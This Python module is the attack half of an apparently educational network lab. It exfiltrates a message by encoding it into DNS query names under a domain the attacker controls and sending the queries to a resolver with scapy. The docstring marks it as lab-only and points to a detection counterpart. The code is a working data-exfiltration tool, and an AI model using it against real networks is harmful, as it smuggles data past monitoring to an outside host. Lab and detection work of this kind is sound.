# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-dnstunnel: exfiltrate data over DNS queries. LAB ONLY.

Encodes the payload into query names under a domain whose authoritative server
you control, so the resolver relays your data out. Detection (see tunnel.py)
watches for long, high-entropy labels.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy

from netlab_dnstunnel.tunnel import encode


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    qnames = encode(args.message.encode(), args.domain)
    print(f"[*] exfiltrating {args.message!r} over {len(qnames)} DNS queries via {args.resolver}")
    for qname in qnames:
        s.send(
            s.IP(dst=args.resolver) / s.UDP(dport=53) / s.DNS(rd=1, qd=s.DNSQR(qname=qname)),
            verbose=0,
        )
    verdict("ALERT", f"sent {len(qnames)} tunnelled queries")
    return 0
